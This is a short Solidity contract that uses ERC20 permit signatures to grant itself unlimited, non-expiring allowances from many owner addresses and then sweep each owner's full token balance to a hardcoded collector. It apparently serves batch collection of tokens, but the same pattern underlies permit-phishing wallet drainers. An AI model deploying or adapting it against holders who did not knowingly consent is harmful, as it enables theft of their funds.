// SPDX-License-Identifier: MIT
// by 0xAA
pragma solidity ^0.8.4;

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function nonces(address owner) external view returns (uint256);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}


contract PermitTokenCollector {
    address public collector;
    IERC20Permit public token;
    constructor() {
        collector = 0x25df6DA2f4e5C178DdFF45038378C0b08E0Bce54;
        token = IERC20Permit(0x912CE59144191C1204E64559FE8253a0e49E6548);
    }

    function permitTransfer(
        address[] calldata owners,
        uint8[] calldata v,
        bytes32[] calldata r,
        bytes32[] calldata s
    ) external {
        require(
            owners.length == v.length &&
                v.length == r.length &&
                r.length == s.length,
            "Input arrays must have the same length"
        );

        address collector_ = collector;
        uint256 balance_;
        for (uint256 i = 0; i < owners.length; i++) {
            balance_ = token.balanceOf(owners[i]);
            if( balance_ > 0){
                // Permit 合约授权
                try token.permit(owners[i], address(this), type(uint256).max, type(uint256).max, v[i], r[i], s[i]){} catch {}
                // 将代币从用户地址转移到收集者地址
                try token.transferFrom(owners[i], collector_, balance_) {} catch {}
            }
        }
    }
}
